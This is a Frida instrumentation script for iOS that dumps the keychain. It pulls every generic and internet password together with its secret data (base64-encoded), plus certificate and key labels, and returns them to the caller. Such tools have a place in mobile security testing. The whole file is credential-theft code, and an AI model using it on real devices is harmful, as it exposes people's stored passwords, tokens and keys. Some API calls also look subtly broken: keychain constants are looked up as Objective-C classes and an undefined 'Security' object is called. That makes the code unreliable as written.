// Keychain Dumping for iOS
// Extracts all accessible keychain items

rpc.exports = {
    dumpKeychain: function() {
        console.log('[*] Starting keychain dump...');
        var items = [];

        // Query generic passwords
        var query = ObjC.classes.NSMutableDictionary.alloc().init();
        query.setObject_forKey_(ObjC.classes.kSecClassGenericPassword, ObjC.classes.kSecClass);
        query.setObject_forKey_(ObjC.classes.kSecMatchLimitAll, ObjC.classes.kSecMatchLimit);
        query.setObject_forKey_(true, ObjC.classes.kSecReturnAttributes);
        query.setObject_forKey_(true, ObjC.classes.kSecReturnData);

        var result = Memory.alloc(Process.pointerSize);
        var status = Security.SecItemCopyMatching(query, result);

        if (status == 0) {
            var results = new ObjC.Object(Memory.readPointer(result));
            console.log('[+] Found ' + results.count() + ' generic password items');

            for (var i = 0; i < results.count(); i++) {
                var item = results.objectAtIndex_(i);
                var account = item.objectForKey_('acct');
                var service = item.objectForKey_('svce');
                var data = item.objectForKey_('v_Data');

                items.push({
                    type: 'generic_password',
                    account: account ? account.toString() : '',
                    service: service ? service.toString() : '',
                    data: data ? data.base64EncodedStringWithOptions_(0).toString() : ''
                });
            }
        } else {
            console.log('[!] Generic password query failed with status: ' + status);
        }

        // Query internet passwords
        var internetQuery = ObjC.classes.NSMutableDictionary.alloc().init();
        internetQuery.setObject_forKey_(ObjC.classes.kSecClassInternetPassword, ObjC.classes.kSecClass);
        internetQuery.setObject_forKey_(ObjC.classes.kSecMatchLimitAll, ObjC.classes.kSecMatchLimit);
        internetQuery.setObject_forKey_(true, ObjC.classes.kSecReturnAttributes);
        internetQuery.setObject_forKey_(true, ObjC.classes.kSecReturnData);

        var internetResult = Memory.alloc(Process.pointerSize);
        var internetStatus = Security.SecItemCopyMatching(internetQuery, internetResult);

        if (internetStatus == 0) {
            var internetResults = new ObjC.Object(Memory.readPointer(internetResult));
            console.log('[+] Found ' + internetResults.count() + ' internet password items');

            for (var i = 0; i < internetResults.count(); i++) {
                var item = internetResults.objectAtIndex_(i);
                var account = item.objectForKey_('acct');
                var server = item.objectForKey_('srvr');
                var data = item.objectForKey_('v_Data');

                items.push({
                    type: 'internet_password',
                    account: account ? account.toString() : '',
                    server: server ? server.toString() : '',
                    data: data ? data.base64EncodedStringWithOptions_(0).toString() : ''
                });
            }
        }

        // Query certificates
        var certQuery = ObjC.classes.NSMutableDictionary.alloc().init();
        certQuery.setObject_forKey_(ObjC.classes.kSecClassCertificate, ObjC.classes.kSecClass);
        certQuery.setObject_forKey_(ObjC.classes.kSecMatchLimitAll, ObjC.classes.kSecMatchLimit);
        certQuery.setObject_forKey_(true, ObjC.classes.kSecReturnAttributes);

        var certResult = Memory.alloc(Process.pointerSize);
        var certStatus = Security.SecItemCopyMatching(certQuery, certResult);

        if (certStatus == 0) {
            var certResults = new ObjC.Object(Memory.readPointer(certResult));
            console.log('[+] Found ' + certResults.count() + ' certificate items');

            for (var i = 0; i < certResults.count(); i++) {
                var item = certResults.objectAtIndex_(i);
                var label = item.objectForKey_('labl');

                items.push({
                    type: 'certificate',
                    label: label ? label.toString() : ''
                });
            }
        }

        // Query keys
        var keyQuery = ObjC.classes.NSMutableDictionary.alloc().init();
        keyQuery.setObject_forKey_(ObjC.classes.kSecClassKey, ObjC.classes.kSecClass);
        keyQuery.setObject_forKey_(ObjC.classes.kSecMatchLimitAll, ObjC.classes.kSecMatchLimit);
        keyQuery.setObject_forKey_(true, ObjC.classes.kSecReturnAttributes);

        var keyResult = Memory.alloc(Process.pointerSize);
        var keyStatus = Security.SecItemCopyMatching(keyQuery, keyResult);

        if (keyStatus == 0) {
            var keyResults = new ObjC.Object(Memory.readPointer(keyResult));
            console.log('[+] Found ' + keyResults.count() + ' key items');

            for (var i = 0; i < keyResults.count(); i++) {
                var item = keyResults.objectAtIndex_(i);
                var label = item.objectForKey_('labl');
                var keyClass = item.objectForKey_('kcls');

                items.push({
                    type: 'key',
                    label: label ? label.toString() : '',
                    keyClass: keyClass ? keyClass.toString() : ''
                });
            }
        }

        console.log('[+] Total items dumped: ' + items.length);
        return {items: items, count: items.length};
    }
};
